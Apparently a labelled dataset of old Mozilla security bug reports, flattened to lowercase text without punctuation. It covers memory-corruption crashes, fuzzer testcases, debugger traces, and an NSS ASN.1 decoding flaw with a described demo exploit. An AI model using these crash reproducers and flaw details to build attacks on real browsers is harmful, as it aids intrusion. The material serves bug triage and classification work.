home/decoder/langfuzz/mozilla-central/js/src/jsgcinlines.h:255 15 in js propertytree newshape this cx at home/decoder/langfuzz/mozilla-central/js/src/jspropertytree.cpp:70 more stack frames follow gdb x 4i pc znk2js2gc11arenaheader9allocatedev+12 mov rax eax znk2js2gc11arenaheader9allocatedev+15 cmp eax znk2js2gc11arenaheader9allocatedev+18 setbe al znk2js2gc11arenaheader9allocatedev+21 leaveq gdb info reg rax rax 140505561694208 bisect shows changeset 68865 e9da34dfa8c5 bad the first bad revision is changeset 68865 e9da34dfa8c5 parent 68610:28bc239d3d9d user luke wagner date wed apr 13 09:27:37 2011 0700 summary bug 644074 simplify and consolidate vm stack code into js/src/vm/stack s-s because of possibly gc-related memory corruption	11
crash textupdater doupdate with long text node 1 start a debug build of firefox 2 enable accessibility e.g by pasting the following into the js console components.classes mozilla.org/accessibilityservice 1 getservice components.interfaces.nsiaccessibleretrieval 3 load the testcase result crash textupdater doupdate trying to access e.g	11
angle crash from canvaslayerd3d9 updatesurface gl context readpixels int int int int unsigned int unsigned int void i got this following the str from bug 675634 having locked my screen as suggested in bug 675634 comment 7 the crash occured some time after unlocking instead of getting bug 675634 i got this new one crash link crash reason exception_access_violation_read crash address 0 libglesv2.dll gl context readpixels gfx/angle/src/libglesv2/context.cpp:2128 1 libglesv2.dll glreadpixels gfx/angle/src/libglesv2/libglesv2.cpp:3956 2 xul.dll mozilla gl glcontext readpixelsintoimagesurface gfx/thebes/glcontext.cpp:1223 3 xul.dll mozilla layers canvaslayerd3d9 updatesurface gfx/layers/d3d9/canvaslayerd3d9.cpp:131 4 xul.dll mozilla layers canvaslayerd3d9 renderlayer gfx/layers/d3d9/canvaslayerd3d9.cpp:211 the crash line is l2128 2109 idirect3dsurface9 systemsurface 2110 hresult result device createoffscreenplainsurface desc.width desc.height desc.format d3dpool_systemmem systemsurface null 2111 2112 if result d3derr_outofvideomemory result e_outofmemory 2113 2114 return error gl_out_of_memory 2115 2116 2117 assert succeeded result 2118 2119 if desc.multisampletype d3dmultisample_none 2120 2121 unimplemented fixme requires resolve using stretchrect into non-multisampled render target 2122 2123 2124 result device getrendertargetdata rendertarget systemsurface 2125 2126 if failed result 2127 2128 systemsurface release crash here so maybe we need to check that createoffscreenplainsurface succeeded	11
crash nscontentutils iseventattributename at address with malloc scribble 1 enable scribble on mac 2 or program received signal exc_bad_access could not access memory reason kern_invalid_address at address in nscontentutils iseventattributename aname atype=1 at work/mozilla/builds/nightly/mozilla/content/base/src/nscontentutils.cpp:2919 2919 if name 0 o name 1 n is deleted memory in scribble bug 675437 supposedly fixed the crash windows crashes with address also deleted memory i do n't see this on linux	11
possible jsscript double-free the problem is in js_clonefunctionobject consider the cross-compartment case where we re clonging fun we create a new function cfun and do cfun u fun getfunctionprivate u for an interpreted script this makes cfun script fun script then we do jsscript cscript js_clonescript cx script and after a null check on cscript make cfun script cscript say that we fail to allocate cscript then we ll have two allocated function objects in different compartments pointing to the same script this is bad because of the compartment thing and also because each function object finalizer will free the script so it will be freed twice	11
crash with after path.pathseglist.appenditem and gc security-sensitive becase it s scary that gc is involved the reduced testcase mysteriously requires a loop i saw an unsafe invalid array index once	11
crash in nsplugininstanceowner releasepluginport void seen while running mozilla/5.0 windows u windows nt 6.1 en-us rv:1.9.3a5pre gecko/20100428 minefield/3.7a5pre str 1 i was composing an email in gmail 2 added to the email and hit send 3 the crash occurred have not been able to repro frame module signature expand source 0 xul.dll nsplugininstanceowner releasepluginport layout/generic/nsobjectframe.cpp:5725 1 xul.dll nsobjectframe callsetwindow layout/generic/nsobjectframe.cpp:1057 2 xul.dll nsobjectframe didreflow layout/generic/nsobjectframe.cpp:1149 3 xul.dll nslinelayout reflowframe layout/generic/nslinelayout.cpp:967 4 xul.dll nsblockframe reflowinlineframe layout/generic/nsblockframe.cpp:3716 5 xul.dll nsblockframe doreflowinlineframes layout/generic/nsblockframe.cpp:3511 6 xul.dll nsblockframe reflowinlineframes layout/generic/nsblockframe.cpp:3365 7 xul.dll nsblockframe reflowline layout/generic/nsblockframe.cpp:2461 8 xul.dll nsblockframe reflowdirtylines layout/generic/nsblockframe.cpp:1907 9 xul.dll nsblockframe reflow layout/generic/nsblockframe.cpp:1009 10 xul.dll nscontainerframe reflowchild layout/generic/nscontainerframe.cpp:736 11 xul.dll nshtmlreflowstate init layout/generic/nshtmlreflowstate.cpp:285 12 xul.dll nscssframeconstructor restyleelement layout/base/nscssframeconstructor.cpp:8007 13	11
compartment mismatched when listening message event assertion failure compartment mismatched at home/pouf/mozilla-central/js/src/jscntxtinlines.h:120 when running the following script in js console var w=top.opener.gbrowser.contentdocument.defaultview w.addeventlistener message function event alert event.data false w.postmessage test i suppose that it only occurs when we listen to message event from another compartment than the event source document	11
assertion failure limit start at jsregexpinlines.h:274 or crash quotestring the following test asserts on mozilla-central tested revision 7054f0e3e70e when run with options j m stepping through violates several more asserts and then crashes the optimized build also crashes i also verified this crash with firefox 7.0a2 see bp-7c8779d1-ac27-4f72-ae94-71a762110817 test was produced by jesse s regexp fuzzer function testregexp res mode strings try re new regexp res mode for var i 0 i strings.length i var str strings i var execresult re.exec str uneval execresult catch e testregexp 3 0 2\\1 i x7f\x7f mmmm_mmmm the nature of the crash and the assert make me believe that this is exploitable with high probability backtrace 29756 invalid read of size 2 29756 at quotestring js sprinter jsstring unsigned int jsopcode.cpp:780 29756 by js_quotestring jsopcode.cpp:844 29756 by js_valuetosource jscontext js value const jsstr.cpp:3489 29756 by array_tosource jscontext unsigned int js value jsarray.cpp:1196 29756 by js invoke jscontext js callargs const js maybeconstruct jscntxtinlines.h:281 29756 by js externalinvoke jscontext js value const js value const unsigned int js value js value jsinterp.h:169 29756 by js_valuetosource jscontext js value const jsstr.cpp:3507 29756 by str_uneval jscontext unsigned int js value jsstr.cpp:308 29756 by js invoke jscontext js callargs const js maybeconstruct jscntxtinlines.h:281 29756 by js interpret jscontext js stackframe js interpmode jsinterp.cpp:4016 29756 by js externalexecute jscontext jsscript jsobject js value jsinterp.cpp:912 29756 by js_executescript jsapi.cpp:4926 29756 address is not stack d malloc d or recently free d	11
crash nssvgswitchelement findactivechild after gc 1 install 2 load the testcase result debug crash nssvgswitchelement findactivechild calling opt crash nsnodeutils contentremoved calling bogus the gc pattern makes me wonder if this is related to bug 335998 being fixed	11
yarr assertion failure static_cast unsigned position pos or optimized crash jsc yarr interpreter checkcharacterclass the following test crashes yarr assert on mozilla-central tested revision 7054f0e3e70e when run with options j m test was produced by langfuzz with the regular expression extension re new regexp b 3 sc a a|ab c|bcd i var str anullxabcd str.replace re function s return s optimized shell furthermore crashes dangerously 12570 invalid read of size 2 12570 at jsc yarr interpreter checkcharacterclass jsc yarr characterclass bool int yarrinterpreter.cpp:212 12570 by jsc yarr interpreter matchcharacterclass jsc yarr byteterm jsc yarr interpreter disjunctioncontext yarrinterpreter.cpp:454 12570 by jsc yarr interpreter matchdisjunction jsc yarr bytedisjunction jsc yarr interpreter disjunctioncontext bool bool yarrinterpreter.cpp:1194 12570 by jsc yarr interpreter matchnonzerodisjunction jsc yarr bytedisjunction jsc yarr interpreter disjunctioncontext bool yarrinterpreter.cpp:1376 12570 by jsc yarr interpreter matchparentheses jsc yarr byteterm jsc yarr interpreter disjunctioncontext yarrinterpreter.cpp:881 12570 by jsc yarr interpreter matchdisjunction jsc yarr bytedisjunction jsc yarr interpreter disjunctioncontext bool bool yarrinterpreter.cpp:1202 12570 by jsc yarr interpreter interpret yarrinterpreter.cpp:1401 12570 by jsc yarr interpret jsc yarr bytecodepattern unsigned short const unsigned int unsigned int int yarrinterpreter.cpp:1901 12570 by js regexp executeinternal jscontext js regexpstatics jsstring unsigned long bool js value jsregexpinlines.h:371 12570 by domatch jscontext js regexpstatics jsstring regexppair const bool jscontext js regexpstatics unsigned long void void matchcontrolflags js value jsregexpinlines.h:167 12570 by js str_replace jscontext unsigned int js value jsstr.cpp:2049 12570 by callcompiler generatenativestub jscntxtinlines.h:281 12570 address is not stack d malloc d or recently free d 12570 12570 12570 process terminating with default action of signal 11 sigsegv 12570 access not within mapped region at address bisect shows the same revision as bug 679986 the yarr import the first bad revision is changeset 70607 cc36a234d0d6 user david mandelin dmandelin mozilla.com date thu may 12 18:39:47 2011 0700 summary bug 625600 update yarr import to webkit rev 86639 r=cdleary dvander it seems unlikely to me though that it s the same bug more likely the import of that webkit revision pulled in a few bugs cloned this from bug 679986 including all tracking flags	11
assertion failure infer failure missing type for arg 1 in jsinfer.cpp i ve crashed twice in the past 24 hours on a self-built linux debug build based on mozilla-central cf1ba8f0dbf71900bb24d77b5a63ad82c279b113 with the following assertion failure pt_pthread_mutex_is_locked lock mutex at home/dbaron/builds/ssd/mozilla-central/mozilla/nsprpub/pr/src/pthreads/ptsynch.c:227 the first of the two crashes i debugged a bit 6 in abort at abort.c:92 7 in pr_assert s pt_pthread_mutex_is_locked lock mutex file home/dbaron/builds/ssd/mozilla-central/mozilla/nsprpub pr/src/pthreads/ptsynch.c ln=227 at home/dbaron/builds/ssd/mozilla-central/mozilla/nsprpub/pr/src/io/prlog.c 587 8 in pr_unlock lock at home/dbaron/builds/ssd/mozilla-central/mozilla/nsprpub/pr/src/pthreads/p tsynch.c:227 9 in autounlockgc cx fmt value optimized out at home/dbaron/builds/ssd/mozilla-central/mozilla/js/src/jscntxt.h:1822 10 print cx fmt value optimized out at home/dbaron/builds/ssd/mozilla-central/mozilla/js/src/jsinfer.cpp:2314 11 js types typefailure cx fmt value optimized out at home/dbaron/builds/ssd/mozilla-central/mozilla/js/src/jsinfer.cpp:338 12 in js mjit stubs assertargumenttypes f at home/dbaron/builds/ssd/mozilla-central/mozilla/js/src/methodjit/stubcall s.cpp:2470 13 in this looks like we re doing autounlockgc when the gc is not locked the script being executed was google-plus related though i think i may have actually been on i m not going to paste urls of the script or the frame because they may have auth info	11
assertion failure infer failure missing type pushed 0 int at jsinfer.cpp:341 with destructuring assignment the following test asserts on mozilla-central revision b7d269a291b6 options m n a function f function g for var i 0 i 3 i x i var x 0 g asserteq x 2 f	11
crash jsc macroassemblercodeptr executableaddress the following test crashes on mozilla-central revision d078623f7875 options m n a tested on 64 bit function testkeytransitions var i key result message var array for i 0 i 10 i key i 3 pop u009e\u0029/g array key i testkeytransitions looks like a null-pointer deref but s-s to be sure 39098 invalid read of size 8 39098 at jsc macroassemblercodeptr executableaddress const macroassemblercoderef.h:150 39098 by jsc repatchbuffer repatchbuffer jsc macroassemblercoderef const repatchbuffer.h:54 39098 by js mjit ic repatcher repatcher js mjit jitscript icrepatcher.h:64 39098 by js mjit ic baseic disable jscontext char const void polyic.cpp:2233 39098 by js mjit ic getelementic disable jscontext char const polyic.cpp:2290 39098 by js mjit ic getelementic update js vmframe jscontext jsobject js value const jsid js value polyic.cpp:2757 39098 by js mjit ic callelement js vmframe js mjit ic getelementic polyic.cpp:2788 39098 by methodjit.cpp:153 39098 by js mjit entermethodjit jscontext js stackframe void js value bool methodjit.cpp:884 39098 by checkstackandentermethodjit jscontext js stackframe void bool methodjit.cpp:945 39098 by js mjit jaegershotatsafepoint jscontext void bool methodjit.cpp:972 39098 by js interpret jscontext js stackframe js interpmode jsinterp.cpp:2206 39098 address is not stack d malloc d or recently free d	11
compartment mismatch when sharing with f1 1 open this url mclaypotch/jscagematch/rainbow.gif 2 share to twitter with f1 3 get a crash/assertion in a debugger this was the stack trace ntdll.dll ntraiseexception 12 bytes ntdll.dll ntraiseexception 12 bytes mozjs.dll js gc cell ismarked unsigned int color line 518 c mozjs.dll js compartmentchecker fail jscompartment c1 jscompartment c2 line 121 bytes c mozjs.dll js compartmentchecker check jscompartment c line 137 bytes c mozjs.dll js compartmentchecker check jsstring str line 151 c mozjs.dll js compartmentchecker check const js value v line 158 c mozjs.dll js assertsamecompartment jsobject js value jscontext cx jsobject t1 js value t2 line 229 c mozjs.dll js calljspropertyop jscontext cx int jscontext jsobject jsid js value op jsobject receiver jsid id js value vp line 328 bytes c mozjs.dll js shape get jscontext cx jsobject receiver jsobject obj jsobject pobj js value vp line 283 bytes c mozjs.dll js_nativegetinline jscontext cx jsobject receiver jsobject obj jsobject pobj const js shape shape unsigned int gethow js value vp line 5218 bytes c mozjs.dll js_getpropertyhelperwithshapeinline jscontext cx jsobject obj jsobject receiver jsid id unsigned int gethow js value vp const js shape shapeout jsobject holderout line 5400 bytes c mozjs.dll js_getpropertyhelperinline jscontext cx jsobject obj jsobject receiver jsid id unsigned int gethow js value vp line 5421 bytes c mozjs.dll js_getpropertyhelper jscontext cx jsobject obj jsid id unsigned int gethow js value vp line 5427 bytes c mozjs.dll js interpret jscontext cx js stackframe entryframe unsigned int inlinecallcount js interpmode interpmode line 4095 bytes c mozjs.dll js runscript jscontext cx jsscript script js stackframe fp line 613 bytes c mozjs.dll js invoke jscontext cx const js callargs argsref js constructoption option line 694 bytes c mozjs.dll js externalinvoke jscontext cx const js value thisv const js value fval unsigned int argc js value argv js value rval line 816 bytes c mozjs.dll js jsproxyhandler call jscontext cx jsobject proxy unsigned int argc js value vp line 273 bytes c mozjs.dll jswrapper call jscontext cx jsobject wrapper unsigned int argc js value vp line 250 bytes c mozjs.dll jscrosscompartmentwrapper call jscontext cx jsobject wrapper unsigned int argc js value vp line 652 bytes c mozjs.dll js jsproxy call jscontext cx jsobject proxy unsigned int argc js value vp line 839 bytes c mozjs.dll js proxy_call jscontext cx unsigned int argc js value vp line 1104 bytes c mozjs.dll js calljsnative jscontext cx int jscontext unsigned int js value native unsigned int argc js value vp line 277 bytes c mozjs.dll js invoke jscontext cx const js callargs argsref js constructoption option line 649 bytes c mozjs.dll js externalinvoke jscontext cx const js value thisv const js value fval unsigned int argc js value argv js value rval line 816 bytes c mozjs.dll js_callfunctionvalue jscontext cx jsobject obj jsval_layout fval unsigned int argc jsval_layout argv jsval_layout rval line 5080 bytes c xul.dll nsxpcwrappedjsclass callmethod nsxpcwrappedjs wrapper unsigned short methodindex const xptmethoddescriptor info nsxptcminivariant nativeparams line 1662 bytes c xul.dll nsxpcwrappedjs callmethod unsigned short methodindex const xptmethoddescriptor info nsxptcminivariant params line 587 c xul.dll prepareanddispatch nsxptcstubbase self unsigned int methodindex unsigned int args unsigned int stackbytestopop line 114 bytes c xul.dll sharedstub line 142 c xul.dll nseventlistenermanager handleeventsubtype nslistenerstruct alistenerstruct nsidomeventlistener alistener nsidomevent adomevent nspidomeventtarget acurrenttarget unsigned int aphaseflags nscxpusher apusher line 1142 bytes c xul.dll nseventlistenermanager handleeventinternal nsprescontext aprescontext nsevent aevent nsidomevent adomevent nspidomeventtarget acurrenttarget unsigned int aflags nseventstatus aeventstatus nscxpusher apusher line 1239 bytes c xul.dll nseventlistenermanager handleevent nsprescontext aprescontext nsevent aevent nsidomevent adomevent nspidomeventtarget acurrenttarget unsigned int aflags nseventstatus aeventstatus nscxpusher apusher line 147 c xul.dll nseventtargetchainitem handleevent nseventchainpostvisitor avisitor unsigned int aflags int amayhavenewlistenermanagers nscxpusher apusher line 216 c xul.dll nseventtargetchainitem handleeventtargetchain nseventchainpostvisitor avisitor unsigned int aflags nsdispatchingcallback acallback int amayhavenewlistenermanagers nscxpusher apusher line 346 c xul.dll nseventdispatcher dispatch nsisupports atarget nsprescontext aprescontext nsevent aevent nsidomevent adomevent nseventstatus aeventstatus nsdispatchingcallback acallback nscomarray nspidomeventtarget atargets line 648 bytes c xul.dll postmessageevent run line 6015 bytes c xul.dll nsthread processnextevent int maywait int result line 618 bytes c xul.dll ns_processnextevent_p nsithread thread int maywait line 245 bytes c xul.dll mozilla ipc messagepump run base messagepump delegate adelegate line 110 bytes c xul.dll messageloop runinternal line 219 c xul.dll messageloop runhandler line 203 c xul.dll messageloop run line 177 c xul.dll nsbaseappshell run line 191 c xul.dll nsappshell run line 249 bytes c xul.dll nsappstartup run line 222 bytes c xul.dll xre_main int argc char argv const nsxreappdata aappdata line 3686 bytes c firefox.exe ns_internal_main int argc char argv line 158 bytes c firefox.exe wmain int argc wchar_t argv line 106 bytes c firefox.exe tmaincrtstartup line 552 bytes c firefox.exe wmaincrtstartup line 371 c kernel32.dll basethreadinitthunk 12 bytes ntdll.dll rtluserthreadstart 8 bytes ntdll.dll rtluserthreadstart 8 bytes	11
assertion failure lastprop hasslot getslot lastprop slot isundefined at jsscope.cpp:1151 the following test asserts on mozilla-central revision fecae145d884 options m n a gczeal 2 object.defineproperty object.prototype b set function function c a b this.a=a this.b=b var f c.bind 2 for var i=0 i 10000 i new f s-s for now because test is gc-related requires gczeal	11
assertion failure isinterpreted at jsfun.h:199 or crash js gc cell compartment the following test asserts on mozilla-central revision 7f4867717226 options m n a function foo2 x n var i 0 while n 0 x i 0 foo2 1,0xae 3,4,5 0123456 stepping through the assert crashes program received signal sigsegv segmentation fault in js gc cell compartment this at jsgc.h:809 809 return arenaheader compartment gdb bt 0 in js gc cell compartment this at jsgc.h:809 1 in popactivevmframe f at srv/repos/mozilla-central/js/src/methodjit/methodjit.cpp:143 2 in jaegertrampolinereturn at srv/repos/mozilla-central/js/src/methodjit/methodjit.cpp:153 3 in 4 in 5 in	11
crash jsobject nonnativesetproperty function function b c if c u function this.x x switch c case 4 case 6 this.r for each let a in new boolean true 0 new boolean true function new boolean true new boolean true function function function try new b a catch e crashes js opt shell 64-bit on mac 10.6 on jm changeset 44ef245b8706 with m a and j at jsobject nonnativesetproperty testcase should be passed in as a cli argument to reproduce the pc value seems to be accessing register r11 at a scary address so locking s-s till shown otherwise	11
assertion failure jsid_is_string id jsid_is_int id at jswatchpoint.cpp:207 the following test asserts on mozilla-central revision a896a9e237a0 options m n var obj obj.watch qname function gc s-s because this is a gc related assert it does not crash though in optimized builds the original test was much more complex due to the missing gc call which i added manually	11
js types typecompartment addpending can write off end of pendingarray if oom in typecompartment addpending we say if pendingcount pendingcapacity growpendingarray cx pendingwork pending pendingarray pendingcount pending.constraint constraint pending.source source pending.type type if growpendingarray fails because of oom then the writes to pending s referent s members are writing off the end of the array it looks as if once pendingcount pendingcapacity we wo n't try to call growpendingarray any more and all subsequent addpending calls will write off the end of that array so we might be able to reach pretty far	11
crash in cairo_dwrite_font_face_scaled_font_create it s 35 top crasher in 8.0b1 while it is only 115 in 7.0.1 and 188 in 6.0.2 there are two kinds of stack traces frame module signature expand source 0 xul.dll cairo_dwrite_font_face_scaled_font_create gfx/cairo/cairo/src/cairo-dwrite-font.cpp:462 1 xul.dll moz_cairo_scaled_font_create gfx/cairo/cairo/src/cairo-scaled-font.c:1054 2 xul.dll dcfromcontext dcfromcontext gfx/thebes/gfxwindowsplatform.h:79 3 xul.dll hbgetglyphadvance gfx/thebes/gfxharfbuzzshaper.cpp:266 4 xul.dll hb_ot_shape_execute_internal gfx/harfbuzz/src/hb-ot-shape.cc:344 5 xul.dll gfxharfbuzzshaper inittextrun gfx/thebes/gfxharfbuzzshaper.cpp:888 6 xul.dll gfxgdifont inittextrun gfx/thebes/gfxgdifont.cpp:166 7 xul.dll gfxfont splitandinittextrun gfx/thebes/gfxfont.cpp:1513 8 xul.dll gfxfontgroup initscriptrun gfx/thebes/gfxfont.cpp:2524 9 xul.dll gfxfontgroup inittextrun gfx/thebes/gfxfont.cpp:2484 10 xul.dll gfxfontgroup maketextrun gfx/thebes/gfxfont.cpp:2418 11 xul.dll textrunwordcache maketextrun gfx/thebes/gfxtextrunwordcache.cpp:850 frame module signature expand source 0 xul.dll cairo_dwrite_font_face_scaled_font_create gfx/cairo/cairo/src/cairo-dwrite-font.cpp:462 1 xul.dll moz_cairo_scaled_font_create gfx/cairo/cairo/src/cairo-scaled-font.c:1054 2 xul.dll cairo_gstate_ensure_scaled_font gfx/cairo/cairo/src/cairo-gstate.c:1811 3 xul.dll getroundoffsetstopixels gfx/thebes/gfxharfbuzzshaper.cpp:932 4 xul.dll gfxharfbuzzshaper setglyphsfromrun gfx/thebes/gfxharfbuzzshaper.cpp:1020 5 xul.dll gfxharfbuzzshaper inittextrun gfx/thebes/gfxharfbuzzshaper.cpp:897 6 xul.dll gfxgdifont inittextrun gfx/thebes/gfxgdifont.cpp:166 7 xul.dll gfxfont splitandinittextrun gfx/thebes/gfxfont.cpp:1513 8 xul.dll gfxfontgroup initscriptrun gfx/thebes/gfxfont.cpp:2524 9 xul.dll gfxfontgroup inittextrun gfx/thebes/gfxfont.cpp:2484 10 xul.dll gfxfontgroup maketextrun gfx/thebes/gfxfont.cpp:2436 11 xul.dll textrunwordcache maketextrun gfx/thebes/gfxtextrunwordcache.cpp:717 12 xul.dll maketextrun layout/generic/nstextframethebes.cpp:551 more reports at	11
crash js mjit entermethodjit with typed array and ti the following test crashes on mozilla-central revision b4da2d439cbc options m n a function f var oa for var i 0 i 8 i var o oa new int32array arraybuffer.prototype length o f this also affects aurora as the n switch ti seems to be required i assume it does not affect beta/release backtrace from m-c debug build 3713 invalid write of size 8 3713 at 3713 by js mjit entermethodjit jscontext js stackframe void js value bool methodjit.cpp:884 3713 by checkstackandentermethodjit jscontext js stackframe void bool methodjit.cpp:945 3713 by js mjit jaegershotatsafepoint jscontext void bool methodjit.cpp:972 3713 by js interpret jscontext js stackframe js interpmode jsinterp.cpp:2174 3713 address is not stack d malloc d or recently free d gdb x 2i pc mov r10 r9 r12,8 mov rbx r12 gdb info registers r9 r10 r12 r9 140737320612472 r10 1125900074577360 r12 2111062325329920	11
crash js mjit ic baseic disable the attached test crashes on mozilla-central revision 866b2b1793cd see readme for running instructions valgrind trace 15832 invalid read of size 8 15832 at js mjit ic baseic disable jscontext char const void polyic.cpp:2330 15832 by picstubcompiler disable jscontext char const polyic.cpp:184 15832 by picstubcompiler disable char const polyic.cpp:180 15832 by js mjit ic getprop js vmframe js mjit ic picinfo polyic.cpp:1992 15832 by methodjit.cpp:164 15832 by 15832 address is not stack d malloc d or recently free d s-s because crashes with this signature have been previously critical	11
carefully chosen values of kernelunitlength can cause lighting filters to overwrite memory they do n't own no description provided	11
tm/jm crash js_getproperty or js analyze scriptanalysis maybecode or assertion failure offset script length or assertion failure script code pc pc endpc a evalcx lazy b b.__proto a a.__proto string for var a 0 a 50 a try b catch e asserts js debug shell on m-c changeset 6cd262091470 with m and j at assertion failure script code pc pc endpc a variant o9 evalcx lazy d d.__proto o9 o9.__proto string.prototype.__proto proto__.__definegetter tostring function for var a 0 a 50 a try d catch e asserts js debug shell on m-c changeset 6cd262091470 with m and j at assertion failure offset script length and crashes js opt shell at js_getproperty tested on 32-bit mac 10.6 setting sg critical because a scary memory address is being read ran autobisect on the second testcase not sure if it s correct autobisect shows this is probably related to the following changeset the first bad revision is changeset 77143:9ca3d16d575c parent 77103:06445f55f009 user brian hackett date sat sep 17 19:14:22 2011 0700 summary infer reapply c2726640029f 3330521cfa4a b68281262e15 bug 557358 6a8947bcc821 bug 684943 50d4f6fa00ce bug 683714 f3dd7cf2d0b3 bug 683999	11
workers files exposes threadsafety assertions with dataowner jonas reports that bent has seen threadsafety assertions from dataowner when manipulating file objects in workers in certain ways	11
assertion failure js srcnotetype sn 3 src_xdelta src_xdelta sn 3 src_destruct at jsopcode.cpp:3543 the following test asserts on mozilla-central revision c60535115ea1 no options required function f x y var j y p a testsyntax 1 a b a true this var src f.tosource 1 n could be related to a decompiler patch that landed recently cc'ing luke and waldo	11
dom related gc cycle collector crash triggered by harfbuzz buffer overrun 1 windows xp only i think may need to reload several times 2 crash nsattrvalue ensureemptymisccontainer beta bp-dac1f532-e438-450c-b5d3-5e3c12111110 aurora bp-67ee699e-b484-4106-bb16-0f7c72111111 nightly bp-3267b454-6e6c-4a49-9da5-d4bfe2111111 other urls see also bug 681118 which is mobile arm/android only i originally saw this in the crash automation where debug beta builds on windows xp were firing crashdumps with hb_ot_layout_get_glyph_property hb_ot_layout_skip_mark pairposformat2 apply hb_apply_context_t pairpos apply hb_apply_context_t poslookupsubtable apply hb_apply_context_t unsigned int stacks but still exiting normally though ted s exploitable tool rated these as low ted i recently updated all my minidump_stackwalk s and your exploitable tool to tip any idea why it would generate dumps for the browser process while the browser would still exit normally making sensitive since ted s flagged it as low and it is gc/cc related	11
assertion we ve overflowed the mspec buffer in nsstandardurl buildnormalizedspec assertion we ve overflowed the mspec buffer mspec.length approxlen file netwerk/base/src/nsstandardurl.cpp line 697 the last major change to this function was in bug 125608	11
insufficient length checking in quickder decoder i m afraid i have to begin the new year with not so nice news the quickder asn.1 decoder in nss has a flaw with rather serious consequences while it rejects bogus oversized lengths when trying to match a buffer against a given template it fails to properly detect a number of zero-length items which are illegal as per x.690 this can cause all sorts of troubles one of them is reported in bug 697420 which happened to be the starting point for my discovery actually depending on what exactly nss or the application does after having called sec_quickderdecodeitem nasty bugs will occur such as 1 cert_decodeocspresponse will mistakenly assume that it has successfully parsed a response even if that response includes a zero-length enumerated value it will return the response to the caller and when code subsequently and rightfully tries to clean up said response cert_destroyocspresponse will crash because it s getting a bogus pointer from ocsp_getresponsesignature response which it tries to dereference 2 cert_decodebasicconstraintvalue is another case where illegal zero-length items lead to a serious problem if a certificate includes a basicconstraints extension where the ca boolean is encoded with zero length nss mistakenly treats such a cert as a ca certificate not as bad as moxie s findings from 2002 about ms capi and basicconstraints but still quite worrying i stopped looking for further issues at that point but it would be quite surprising if these were the only ones from my reading of x.690 of the 25 asn.1 universal types currently recognized/defined in secasn1t.h the following 7 can never have zero length when properly der encoded boolean integer bit string object_identifier enumerated utctime generalizedtime quickder should abort further processing when the template specifies one of these types and the buffer being processed holds such an illegal encoding it s probably debatable what level of content checking should go into quickder and what checks are better done in code which actually parses the values such as der_getinteger but some minimal zero-length sanity checks seem justified in quickder the attached patch is a possible approach note that due to re-indentation the changes might appear larger at first sight than they effectively are a demo exploit for the two issues mentioned above can be seen by visiting first the ca cert attached to this bug needs to be installed and trusted for ssl a default setup of firefox will then crash immediately in cert_destroyocspresponse when opening the above url note that the ca cert is n't really a certificate with ca set to true but nss considers it a valid ca cert as asn.1 is at the heart of many parts of nss there are dozens of sec_quickderdecodeitem calls in lib x.509/pkix processing heavily depends on it the potential impact of this issue should not be underestimated applications and nss itself must be able to rely on sec_quickderdecodeitem rejecting invalid asn.1 data when asked to match this input against a given template note that the classic der decoder i.e sec_asn1decodeitem has checks for illegal zero-length items and will e.g reject an ocsp response where the response status is n't encoded properly finally let me point out that the patch also includes a second belt-and-suspenders type fix when returning a dest item with zero length for those asn.1 types where this is acceptable as per x.690 such as strings quickder should not fill bogus pointers into dest data if code dealing with a secitem afterwards only checks for a non-null data pointer without looking at the secitem s length at the same time even more subtle bugs may surface the cert_decodebasicconstraintvalue actually being an example of this i did not yet request a cve id number for this issue let me know if i should do this or if mozilla can get an assignment	9
assertion mdocumentprincipal prematurely set with document.write to multiple documents assertion mdocumentprincipal prematurely set mdocumentprincipal nsnull file dom/base/nsglobalwindow.cpp line 1805	11
crash nscomptr imgidecoderobserver nscomptr imgidecoderobserver this bug was initially created as a clone of bug 587720 1 2 crash beta/9 windows xp/7 i could n't reproduce this locally operating system windows nt 5.1.2600 service pack 3 cpu x86 genuineintel family 6 model 44 stepping 2 1 cpu crash reason exception_access_violation_read crash address thread 0 crashed 0 xul.dll nscomptr imgidecoderobserver nscomptr imgidecoderobserver imgidecoderobserver nscomptr.h 600 eip esp ebp ebx esi edi eax ecx edx efl found by given as instruction pointer in context 1 xul.dll imgrequestproxy onstoprequest int imgrequestproxy.cpp 737 eip esp ebp found by call frame info 2 xul.dll imgstatustracker emulaterequestfinished imgrequestproxy unsigned int int imgstatustracker.cpp 291 eip esp ebp found by call frame info 3 xul.dll imgrequest removeproxy imgrequestproxy unsigned int int imgrequest.cpp 320 eip esp ebp found by call frame info 4 xul.dll imgrequestproxy docancel unsigned int imgrequestproxy.cpp 294 eip esp ebp found by call frame info 5 xul.dll imgrequestproxy imgcancelrunnable run imgrequestproxy.h 157 eip esp ebp found by call frame info beta/9 mac os x 1 2 shutdown 3 crash i can reproduce this locally on mac os x operating system mac os x 10.6.8 10k549 cpu amd64 family 6 model 23 stepping 10 2 cpus crash reason exc_bad_access crash address thread 0 crashed 0 xul nscomptr imgidecoderobserver nscomptr nscomptr.h 600 rbx r12 r13 r14 r15 rip rsp rbp found by given as instruction pointer in context 1 xul imgrequestproxy onstoprequest imgrequestproxy.cpp 737 rbx r12 r13 r14 r15 rip rsp rbp found by call frame info 2 xul imgstatustracker emulaterequestfinished imgstatustracker.cpp 291 rbx r12 r13 r14 r15 rip rsp rbp found by call frame info 3 xul imgrequest removeproxy imgrequest.cpp 320 rbx r12 r13 r14 r15 rip rsp rbp found by call frame info running under gdb with scribble malloc enabled i get program received signal exc_bad_access could not access memory reason kern_invalid_address at address in nscomptr imgidecoderobserver nscomptr this arawptr at nscomptr.h:600 600 nscap_addref this mrawptr gdb bt 0 in nscomptr imgidecoderobserver nscomptr this arawptr at nscomptr.h:600 1 in imgrequestproxy onstoprequest this lastpart=0 at work/mozilla/builds/beta/mozilla/modules/libpr0n/src/imgrequestproxy.cpp:737 2 in imgstatustracker sendstoprequest this aproxy alastpart=0 astatus=0 at work/mozilla/builds/beta/mozilla/modules/libpr0n/src/imgstatustracker.cpp:522 3 in imgrequest onstoprequest this arequest ctxt status=0 at work/mozilla/builds/beta/mozilla/modules/libpr0n/src/imgrequest.cpp:948 4 in nspartchannel sendonstoprequest this acontext astatus=0 at work/mozilla/builds/beta/mozilla/netwerk/streamconv/converters/nsmultimixedconv.cpp:120 5 in nsmultimixedconv sendstop this astatus=0 at work/mozilla/builds/beta/mozilla/netwerk/streamconv/converters/nsmultimixedconv.cpp:857 gdb info registers eax 1431655769 ecx 0 edx 1073755128 ebx 87254596 esp ebp esi 680200696 edi 87166200 eip nscomptr imgidecoderobserver nscomptr imgidecoderobserver 33 eflags 2163206 cs 23 ss 31 ds 31 es 31 